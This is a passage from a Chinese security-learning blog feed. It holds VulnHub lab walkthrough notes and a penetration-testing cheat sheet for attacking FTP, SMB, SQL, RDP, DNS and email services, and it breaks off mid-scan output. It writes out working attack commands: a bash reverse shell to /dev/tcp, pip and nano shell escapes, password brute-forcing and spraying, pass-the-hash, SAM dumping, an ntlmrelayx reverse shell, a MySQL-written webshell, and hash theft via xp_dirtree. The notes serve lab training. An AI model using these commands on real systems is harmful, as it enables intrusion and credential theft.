密钥对中的一部分，用于对连接进行身份验证和加密通信。私钥需要受到保护，以防止未经授权的访问。</p><p>通常情况下，SSH 密钥对由两部分组成：公钥和私钥。公钥存储在远程服务器上，而私钥存储在本地机器上。当您尝试进行 SSH 连接时，您的私钥将用于身份验证。</p><p>如果您的私钥设置了 passphrase（也称为密码短语），则在每次使用私钥进行身份验证时，您都需要输入这个 passphrase。这增加了私钥的安全性，因为即使其他人获得了您的私钥文件，他们也无法在没有知道 passphrase 的情况下使用它。</p></blockquote><p>在提权时给的特权命令制定了非root用户，只能横向移动：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103261.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103373.png" alt="img"></p><p>最后提权部分用到pip，文件给的提权代码：</p><pre><code>TF=$(mktemp -d)echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.pypip install $TF</code></pre><p>核心部分还有点疑惑，留个引子</p><h1 id="thale"><a href="#thale" class="headerlink" title="thale"></a>thale</h1><p><a href="https://www.cnblogs.com/sainet/p/15655638.html">Vulnhub 靶场 THALES: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机只能说中规中矩吧，web部分用到了msf 和msfveno，感觉很少用到msfveno但确实挺好用的</p><p>提权部分几个博客园的博主讲得都不算很好，尤其是用backup.sh反弹root shell 时为什么等一会就能连接上，我查看了crontab和ps aux ，没有root是看不到定时任务，只有在ps进程中看到了备份脚本在被root执行：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181112204.png" alt="image-20230818111232141"></p><p>root:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181113859.png" alt="image-20230818111307806"></p><p>这里看到脚本5min执行一次</p><p>我们根据脚本指引来到保存备份文件的地方，发现上一次备份在5分钟前：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181116917.png" alt="image-20230818111611873"></p><p>（其实这里是写文章的时候刚好过了五分钟被截到），一般而言是可以看到上一次备份在几分钟前从而确证它可以自动执行备份。</p><p>最后有提个挺有意思的是，横向移动的时候发现su提示需要一个终端，而使用pty提权后就可以移动了</p><p>大概查了一下：</p><p><a href="https://www.cnblogs.com/sainet/p/15783539.html">Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园 (cnblogs.com)</a></p><p>推测nc得到的shell比较受限，查询了一下TTY：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181124899.png" alt="image-20230818112416855"></p><p>这里看到一直用的一句话提权实际上是伪终端（那就是说伪终端也算终端咯？）</p><h1 id="ICA1"><a href="#ICA1" class="headerlink" title="ICA1"></a>ICA1</h1><p><a href="https://blog.csdn.net/ROSEBUD7_K/article/details/126163403">vulnhub-ica1-通关流程 &#x2F;&#x2F; Kali &amp; 靶场 &amp; 渗透 &amp; Linux_KHDXS7的博客-CSDN博客</a></p><p>挺有意思的一个靶机，先后用了不同的php脚本才反弹了一个可用的shell虽然还是很难用。。</p><p>在web部分dirb先扫到了一个upload目录，在里面有一个users和attachment目录，估计有文件上传漏洞，然后在配置文件中找到了mysql账户密码，登录之后在数据库中分别找到了管理员的邮箱和phpass加密的密码，以及一些用户名表和base64加密的密码表。</p><blockquote><p><code>phpass</code> 以密码哈希算法的方式实现了这一点，同时还提供了一些附加的安全性功能，如防止彩虹表攻击、重放攻击等。</p><p>主要功能和设计原则包括：</p><ol><li><strong>强密码哈希</strong>：<code>phpass</code> 使用哈希算法对密码进行多轮迭代，从而增加破解难度。</li><li><strong>盐值（Salt）</strong>：<code>phpass</code> 使用随机生成的盐值来增加密码哈希的随机性，以及对相同密码的不同哈希值。这有助于防止彩虹表攻击。</li><li><strong>迭代计算</strong>：<code>phpass</code> 通过多次迭代哈希算法，增加破解密码的成本，从而提高密码的安全性。</li><li><strong>密码更新</strong>：<code>phpass</code> 支持密码更新，同时保留旧密码的哈希值，以便在用户登录时验证旧密码。</li><li><strong>防护</strong>：<code>phpass</code> 试图防止不同类型的攻击，如嗅探攻击、重放攻击等。</li><li><code>$P$</code> 是 <code>phpass</code> 中的一个标识符</li></ol></blockquote><p>此时有了两种进攻方式，一个是破解管理员的账户密码，从网页登录管理员后台寻找漏洞，一个是用hydra使用这两个表进行ssh爆破，实际两种都是可行的。</p><p>这里破解管理员密码实际上是使用<code> mkpasswd</code> 创建一个密码替换了原来的密码，正好是Mysql管理员可以执行这个操作，也算是提供了一个思路，那么其实另外一个用户密码表应该也能这么做。</p><p>在管理员后台一个是可以创建用户上传头像，另一个是可以创建工程添加附件，这正好对应了之前upload里猜测的有文件上传漏洞。</p><p>提权部分使用string检查特权文件，发现它在suid下执行cat，使用命令劫持提权成功</p><h1 id="noob："><a href="#noob：" class="headerlink" title="noob："></a>noob：</h1><p><a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机挺无语的，web部分拿到了一个信息隐写的压缩文件，然后使用<code>steghide</code>进行拆解:</p><p><code>info &lt;filename&gt;</code>:显示文件信息</p><p><code>extract -sf &lt;filename&gt;</code>:拆解文件（需要密码短语，可能为空）</p><p>后面的提权就是找找找，很难想象有一台明文保存其他用户账号密码的用户配置……找了很多东西发现不如遍历本地用户目录</p><p>最后的nano提权文件给出的wp：</p><pre><code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre><blockquote><ul><li><code>reset</code>: 这是一个命令，通常用于重置终端显示，清除屏幕上的内容，使终端重新初始化。</li><li><code>sh</code>: 这是一个启动 Shell（命令行解释器）的命令。在这里，它被用于启动一个新的 Shell 进程。</li><li><code>1&gt;&amp;0</code> 和 <code>2&gt;&amp;0</code>：这些是重定向操作符。<code>1&gt;&amp;0</code> 表示将标准输出（文件描述符 1）重定向到标准输入（文件描述符 0），<code>2&gt;&amp;0</code> 表示将标准错误（文件描述符 2）重定向到标准输入（文件描述符 0）。</li></ul></blockquote><p>没有很理解，可能是重启一个终端sh然后把所有信息都重定向到当前nano的输入以便于显示？因为不执行reset整个shell就死机了，不重定向看不到回显</p><h1 id="DRIPPING-BLUES-1"><a href="#DRIPPING-BLUES-1" class="headerlink" title="DRIPPING BLUES: 1"></a>DRIPPING BLUES: 1</h1><p><a href="https://www.freebuf.com/articles/web/327947.html">【Vulnhub 靶场】DRIPPING BLUES: 1 - FreeBuf网络安全行业门户</a></p><p>这个靶机需要破解加密的zip文件：</p><p><code>fcrackzip </code></p><pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip</code></pre><p>这里提到ftp穷举爆破可以使用MSF：ftp_login模块</p><p>在robots中发现一个&#x2F;etc。。。推断有文件包含漏洞。</p><p>第二次遇到使用Polkit提权：</p><blockquote><p>基本目前除了最新版的Polkit修复了该漏洞，其他版本都可以提权，可利用版本的范围极大。（<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py%EF%BC%89">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py）</a></p></blockquote><p>这里该博主拿到shell后的环境检测也挺细致的</p><h1 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h1><p><a href="https://www.cnblogs.com/sainet/p/15673203.html">Vulnhub 靶场 DOUBLETROUBLE: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这里再次用到了图片隐写：stegseek</p><p>爆破：stegseek -crack *.png rockyou.txt -xf output</p><p>上一次拆解隐藏信息的文件使用的是steghide,查询了一下大致seek用于检测，hide大多是用于隐写，当然提取也可以。</p><p>在第二次提权部分我确实不知道怎么快速辨别这个靶机存在dirtucow漏洞，可能遇到比较老的版本都可以拿去对比一下吧</p><h1 id="darkhole2"><a href="#darkhole2" class="headerlink" title="darkhole2 *"></a>darkhole2 *</h1><p><a href="https://blog.csdn.net/weixin_44862511/article/details/132259658">VulnHub-DarkHole_2靶机实战(超详细保姆级教程)_徐长卿学网安的博客-CSDN博客</a></p><p>这个靶机在网页上布置了.git，通过工具<a href="https://github.com/lijiejie/GitHack">githack</a>、<a href="https://github.com/arthaud/git-dumper">git-dumper</a>下载整个仓库分析</p><p>git log</p><p>git diff XXXX</p><p>提权部分涉及到ssh -l的一个映射，搞了半天终于明白了：</p><blockquote><p>ssh <a href="mailto:&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;">&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;</a> -L </p><p>9999:192.168.91.144:9999</p><p>这将在本地计算机上创建一个 SSH 隧道，将本地计算机上的 9999 端口的数据转发到远程主机 <code>192.168.91.142</code>，然后由远程主机将数据再次转发到远程主机 <code>192.168.91.144</code> 的 9999 端口。</p><p>其中</p><p>-L [bind_address:]port:forward-host:forward-port</p><ul><li><code>bind_address</code>：这是一个可选部分，表示绑定的本地地址。通常可以省略，使得 SSH 监听所有可用的网络接口。</li><li><code>port</code>：这是本地计算机上监听的端口。</li><li><code>forward-host</code>：这是远程主机的地址。</li><li><code>forward-port</code>：这是远程主机上的端口。</li></ul></blockquote><p>实际上是把本地某端口的数据交由ssh连接的主机再转发，相当于代理的感觉</p><p>在反弹shell的时候发现bash -i不能反弹，具体原因不是很清楚，但是嵌套**<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.91.140/9001 0&gt;&amp;1&#39;</code>**成功反弹，查询后发现：</p><blockquote><p>嵌套 shell 的原因有以下几点：</p><ol><li><strong>维持稳定性</strong>：嵌套 shell 可以在连接中保持稳定，即使连接的初始 shell 会话（例如通过 <code>nc</code> 或 <code>bash</code> 创建的连接）被关闭或中断，嵌套 shell 可以继续运行，确保攻击者能够继续执行操作。</li><li><strong>隐藏连接</strong>：嵌套 shell 可以隐藏连接细节，使连接更加隐蔽。通过将初始连接与嵌套 shell 连接分开，可以减少检测和防御系统发现连接的风险。</li><li><strong>适应性</strong>：嵌套 shell 可以在不同的环境和情况下更灵活地使用。例如，通过在嵌套 shell 中执行各种命令，攻击者可以根据需要进行操作。</li><li><strong>错误处理</strong>：嵌套 shell 可以处理连接中的错误情况，确保连接中断或其他问题不会导致整个攻击操作失败。</li></ol></blockquote><p>如果单层的反弹不行，可以试一下嵌套</p><p>另外发现：crontab只能查看当前用户的定时任务，直接读取&#x2F;etc&#x2F;crontab可以查看本机上的定时任务</p><p>ss命令：</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p>以下是一些常用的 <code>ss</code> 命令选项和用法示例：</p><ol><li><p><strong>显示所有网络连接</strong>：</p><pre><code class="bash">ss -tuln</code></pre><p>这会显示所有 TCP（-t）和 UDP（-u）连接的监听端口（-l）信息，以数字格式显示（-n）。</p></li><li><p><strong>显示指定端口的监听情况</strong>：</p><pre><code class="bash">ss -tuln | grep 80</code></pre><p>这会过滤并显示所有监听端口为 80 的连接。</p></li><li><p><strong>显示套接字统计信息</strong>：</p><pre><code class="bash">ss -s</code></pre><p>这会显示套接字统计信息，包括打开的套接字数量、连接状态等。</p></li><li><p><strong>显示 TCP 套接字信息</strong>：</p><pre><code class="bash">ss -t</code></pre><p>这会显示所有 TCP 套接字的详细信息。</p></li><li><p><strong>显示 UDP 套接字信息</strong>：</p><pre><code class="bash">ss -u</code></pre><p>这会显示所有 UDP 套接字的详细信息。</p></li><li><p><strong>显示 Unix 套接字信息</strong>：</p><pre><code class="bash">ss -x</code></pre><p>这会显示所有 Unix 套接字（本地套接字）的详细信息。</p></li><li><p><strong>显示特定用户的套接字信息</strong>：</p><pre><code class="bash">ss -tuln | grep username</code></pre><p>这会过滤并显示与特定用户名相关的连接信息。</p></li><li><p><strong>显示所有套接字信息（包括监听和连接）</strong>：</p><pre><code class="bash">ss -a</code></pre><p>这会显示所有套接字的信息，包括监听和连接状态。</p></li></ol><p>一般可以先-s查看统计信息然后再具体查看相关类型套接字</p><h1 id="BEELZEBUB-1"><a href="#BEELZEBUB-1" class="headerlink" title="BEELZEBUB: 1"></a>BEELZEBUB: 1</h1><p><a href="https://www.cnblogs.com/upfine/p/16888142.html">upfine的博客 (cnblogs.com)</a></p><p>感觉主要是枚举，但有一些扫到的可能有用的目录啥的确实没用上，这里有一个专门针对wp的wpscan，使用-e可以进行枚举，-force忽略检测网站是否是wordpress</p><p>这里提权又遇到policykit，发现在exdb上查询相关名称可以检索到</p><h1 id="hackable-III"><a href="#hackable-III" class="headerlink" title="hackable III"></a>hackable III</h1><p><a href="https://blog.csdn.net/weixin_39368364/article/details/119917637">VulnHub靶机_HACKABLE: III_Yiru Zhao的博客-CSDN博客</a></p><p>图片隐写、端口碰撞、lxd提权</p><p>这里端口碰撞但是没办法启动端口。。。</p><h1 id="hackkid"><a href="#hackkid" class="headerlink" title="hackkid *"></a>hackkid *</h1><p><a href="https://www.freebuf.com/articles/web/324396.html">vulnhub-Hacker_Kid靶机渗透过程 - FreeBuf网络安全行业门户</a></p><p>这个靶机遇到了几个不熟悉的漏洞，比如SSTI注入、DNS区域传输漏洞、Capabilities提权等</p><p>关于DNS区域传输：</p><p>dig  axfr @192.168.26.139  blackhat.local</p><p>这里另一个博主没有使用axfr也能挖到，但是得到的内容比较少</p><p>然后关于SSTI注入：</p><p>该注入也能进行XSS，：这里给出了一个模板注入通用的测试payload：NaN${1+abcdef}<?1+abcdef?>[1+abcdef]</p><p><a href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><blockquote><p>发现<code>&#123;&#123; --- &#125;&#125;</code>其中的语句被执行了</p><ul><li>这是因为在flask中，渲染引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行</li><li>那么，在上一段代码中，如果我们传入的参数内容为<code>&#123;&#123; --- &#125;&#125;</code>包裹的代码，这些代码就会被执行</li></ul></blockquote><p>cap部分：这条命令可以用于发现具有Capabilities特殊操作权限的程序。</p><pre><code>getcap -r / 2&gt;/dev/null      # -r 递归查询</code></pre><p>因为需要找root进程进行注入，所以简单写个shell脚本对root进程进行批量尝试。</p><pre><code>for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;`; do python2.7 inject.py $i; done</code></pre><p>通过ss -pantu 找到tcp监听的bind shell，kali使用nc连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attacking SERVICES</title>
      <link href="/2023/08/10/SERVICES/"/>
      <url>/2023/08/10/SERVICES/</url>
      
        <content type="html"><![CDATA[<h1 id="Attacking-FTP"><a href="#Attacking-FTP" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><p> <a href="https://github.com/jmk-foofus/medusa">Medusa</a></p><p>使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。</p><span id="more"></span><pre><code class="shell-session">Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp </code></pre><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="攻击-FTP"><a href="#攻击-FTP" class="headerlink" title="攻击 FTP"></a>攻击 FTP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ftp 192.168.2.142</code></td><td>使用客户端连接到 FTP 服务器。<code>ftp</code></td></tr><tr><td><code>nc -v 192.168.2.142 21</code></td><td>使用 连接到 FTP 服务器。<code>netcat</code></td></tr><tr><td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td><td>暴力破解 FTP 服务。</td></tr></tbody></table><hr><h2 id="攻击中小企业"><a href="#攻击中小企业" class="headerlink" title="攻击中小企业"></a>攻击中小企业</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>smbclient -N -L //10.129.14.128</code></td><td>针对 SMB 服务的空会话测试。</td></tr><tr><td><code>smbmap -H 10.129.14.128</code></td><td>使用 进行网络共享枚举。<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 -r notes</code></td><td>使用 .<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td><td>从共享文件夹下载特定文件。</td></tr><tr><td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td><td>将特定文件上传到共享文件夹。</td></tr><tr><td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td><td>空会话与 .<code>rpcclient</code></td></tr><tr><td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td><td>使用 自动枚举 SMB 服务。<code>enum4linux-ng</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td><td>针对列表中的不同用户喷洒密码。</td></tr><tr><td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td><td>使用 连接到 SMB 服务。<code>impacket-psexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td><td>使用 对 SMB 服务执行命令。<code>crackmapexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td><td>枚举登录用户。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td><td>从 SAM 数据库中提取哈希。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td><td>使用哈希传递技术在目标主机上进行身份验证。</td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td><td>使用 转储 SAM 数据库。<code>impacket-ntlmrelayx</code></td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td><td>使用 执行基于 PowerShell 的反向外壳。<code>impacket-ntlmrelayx</code></td></tr></tbody></table><hr><h2 id="攻击-SQL-数据库"><a href="#攻击-SQL-数据库" class="headerlink" title="攻击 SQL 数据库"></a>攻击 SQL 数据库</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td><td>连接到 MySQL 服务器。</td></tr><tr><td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td><td>连接到 MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 MSSQL 服务器，而 MSSQL 服务器使用 Windows 身份验证机制。</td></tr><tr><td><code>mysql&gt; SHOW DATABASES;</code></td><td>显示 MySQL 中的所有可用数据库。</td></tr><tr><td><code>mysql&gt; USE htbusers;</code></td><td>在 MySQL 中选择一个特定的数据库。</td></tr><tr><td><code>mysql&gt; SHOW TABLES;</code></td><td>在 MySQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>mysql&gt; SELECT * FROM users;</code></td><td>从MySQL中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td><td>显示 MSSQL 中的所有可用数据库。</td></tr><tr><td><code>sqlcmd&gt; USE htbusers</code></td><td>在 MSSQL 中选择特定的数据库。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td><td>在 MSSQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM users</code></td><td>从 MSSQL 中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td><td>允许更改高级选项。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td><td>启用xp_cmdshell。</td></tr><tr><td><code>sqlcmd&gt; RECONFIGURE</code></td><td>在每个sp_configure命令之后使用以应用更改。</td></tr><tr><td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td><td>从 MSSQL 服务器执行系统命令。</td></tr><tr><td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td><td>使用 MySQL 创建一个文件。</td></tr><tr><td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td><td>检查安全文件权限是否为空，以读取系统上本地存储的文件。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td><td>读取 MSSQL 中的本地文件。</td></tr><tr><td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td><td>在 MySQL 中读取本地文件。</td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_dirtree</code></td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_subdirs</code></td></tr><tr><td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td><td>标识 MSSQL 中的链接服务器。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td><td>标识用户及其在 MSSQL 中用于远程连接的权限。</td></tr></tbody></table><hr><h2 id="攻击-RDP"><a href="#攻击-RDP" class="headerlink" title="攻击 RDP"></a>攻击 RDP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td><td>针对 RDP 服务喷洒密码。</td></tr><tr><td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td><td>暴力破解 RDP 服务。</td></tr><tr><td><code>rdesktop -u admin -p password123 192.168.2.143</code></td><td>在 Linux 中使用连接到 RDP 服务。<code>rdesktop</code></td></tr><tr><td><code>tscon #&#123;TARGET_SESSION_ID&#125; /dest:#&#123;OUR_SESSION_NAME&#125;</code></td><td>在没有密码的情况下模拟用户。</td></tr><tr><td><code>net start sessionhijack</code></td><td>执行 RDP 会话劫持。</td></tr><tr><td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td><td>在目标 Windows 主机上启用“受限管理模式”。</td></tr><tr><td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td><td>使用哈希传递技术在没有密码的情况下登录目标主机。</td></tr></tbody></table><hr><h2 id="攻击域名解析"><a href="#攻击域名解析" class="headerlink" title="攻击域名解析"></a>攻击域名解析</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td><td>对特定名称服务器执行 AXFR 区域传输尝试。</td></tr><tr><td><code>subfinder -d inlanefreight.com -v</code></td><td>暴力破解子域。</td></tr><tr><td><code>host support.inlanefreight.com</code></td><td>指定子域的 DNS 查找。</td></tr></tbody></table><hr><h2 id="攻击电子邮件服务"><a href="#攻击电子邮件服务" class="headerlink" title="攻击电子邮件服务"></a>攻击电子邮件服务</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host -t MX microsoft.com</code></td><td>指定域的邮件服务器的 DNS 查找。</td></tr><tr><td>&#96;dig mx inlanefreight.com</td><td>grep “MX”</td></tr><tr><td><code>host -t A mail1.inlanefreight.htb.</code></td><td>指定子域的 IPv4 地址的 DNS 查找。</td></tr><tr><td><code>telnet 10.10.110.20 25</code></td><td>连接到 SMTP 服务器。</td></tr><tr><td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td><td>对指定主机使用 RCPT 命令进行 SMTP 用户枚举。</td></tr><tr><td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td><td>验证指定域的 Office365 使用情况。</td></tr><tr><td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td><td>枚举在指定域上使用 Office365 的现有用户。</td></tr><tr><td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td><td>针对对指定域使用 Office365 的用户列表进行密码喷涂。</td></tr><tr><td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td><td>暴力破解 POP3 服务。</td></tr><tr><td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td><td>测试 SMTP 服务是否存在开放中继漏洞。</td></tr></tbody></table><h1 id="Attacking-FTP-1"><a href="#Attacking-FTP-1" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing-1"><a href="#Brute-Forcing-1" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><h4 id="FTP-Bounce-Attack"><a href="#FTP-Bounce-Attack" class="headerlink" title="FTP Bounce Attack"></a>FTP Bounce Attack</h4><p>FTP反弹攻击 FTP反弹攻击是一种使用FTP服务器将出站流量传递到网络上另一个设备的网络攻击。攻击者使用PORT命令诱骗FTP连接运行命令并从预期服务器以外的设备获取信息。 假设我们的目标是暴露在互联网上的FTP服务器FTP_DMZ。同一网络中的另一个设备Internal_DMZ没有暴露在互联网上。我们可以使用与FTP_DMZ服务器的连接，使用FTP Bounce攻击扫描Internal_DMZ，并获取有关服务器打开端口的信息。然后，我们可以将这些信息作为攻击基础设施的一部分。</p><p>Nmap-b标志可用于执行FTP反弹攻击：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>FTP 服务在哪个端口上运行？</p><p>FTP 服务器可以使用什么用户名？</p><p>使用发现的用户名及其密码通过SSH登录并获取标志.txt文件。提交内容作为您的答案。</p></blockquote><p>先扫描主机：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111503815.png" alt="image-20230811150309711">发现都有防火墙保护，挨个端口扫描发现2121端口开了ftp服务</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111504966.png" alt="image-20230811150445925"></p><p>他这里允许匿名登录ftp，链接上去后发现了一个密码本和一个用户列表，用hydra或者Medusa爆破一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111506125.png" alt="image-20230811150617076"></p><p>然后ssh登录即可</p><h1 id="Attacking-SMB"><a href="#Attacking-SMB" class="headerlink" title="Attacking SMB"></a>Attacking SMB</h1><p>根据SMB实现和操作系统的不同，我们将使用Nmap获得不同的信息。请记住，在针对Windows操作系统时，版本信息通常不会包含在Nmap扫描结果中。相反，Nmap将尝试猜测操作系统的版本。然而，我们通常需要其他扫描来确定目标是否容易受到特定攻击。我们将在本节稍后介绍搜索已知漏洞。现在，让我们扫描端口139和445 TCP。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CESTNmap scan report for 10.129.14.128Host is up (0.00024s latency).PORT    STATE SERVICE     VERSION139/tcp open  netbios-ssn Samba smbd 4.6.2445/tcp open  netbios-ssn Samba smbd 4.6.2MAC Address: 00:00:00:00:00:00 (VMware)Host script results:|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-09-19T13:16:04|_  start_date: 